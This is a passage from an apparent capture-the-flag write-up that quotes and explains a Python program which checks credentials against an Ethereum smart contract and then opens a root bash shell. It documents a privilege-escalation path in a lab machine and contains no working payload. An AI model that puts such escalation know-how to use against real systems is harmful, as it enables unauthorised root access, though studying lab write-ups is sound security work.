                tx_receipt = w3.eth.waitForTransactionReceipt(tx_hash)
                caddress = tx_receipt.contractAddress
                f.write("{}\r\n".format(caddress))
                f.close()

        # Contract instance
        contractInstance = w3.eth.contract(address=caddress,
                                           abi=contractData['abi'])

```

That is consistent with what I saw where `address.txt` wasn’t there, but then it was after running the binary.

Next it reads `user` and `pwd` from the terminal, and then gets `username` and `password` from Web3:

```

        try:
            user = input("Username: ")
            pwd = getpass.getpass("Password: ")
        except KeyboardInterrupt:
            print("")
            exit()

        # Calling the function of contract
        username = contractInstance.functions.getUsername().call()
        password = contractInstance.functions.getPassword().call()

```

Now there’s a series of checks, just like I experienced, checking that the entered username and password match the ones from the contract, that the user is approved, and that the balance is 1000:

```

        if username.strip() or password.strip():
            p = hashlib.md5()
            p.update(pwd.encode('utf-8'))
            if username == user and password == p.hexdigest():
                approve = contractInstance.functions.getApprove().call()
                if approve == True:
                    balance = contractInstance.functions.getBalance().call()
                    if balance == 1000:
                        contractInstance.functions.reset().call()
                        inner_banner()
                        os.system("cd /home/bobby/projects/ChainsawClub && /bin/bash")
                    else:
                        print ("{}[*]{} Not enough funds!".format(CRED,CEND))
                else:
                    print ("{}[*]{} User is not approved!".format(CRED,CEND))
            else:
                print ("{}[*]{} Wrong credentials!".format(CRED,CEND))
        else:
            print ("{}[*]{} Blank credentials are not allowed!".format(CRED,CEND))

        try:
            time.sleep(5)
        except KeyboardInterrupt:
            print("")
            exit()

```

If all the `if` statements work out, it prints `inner_banner()`, and then runs `os.system("cd /home/bobby/projects/ChainsawClub && /bin/bash")`, providing the root shell.

This contract only allows one username / password at a time, and I suspect it was kind of a pain if you happened to be working this at the same time as someone else.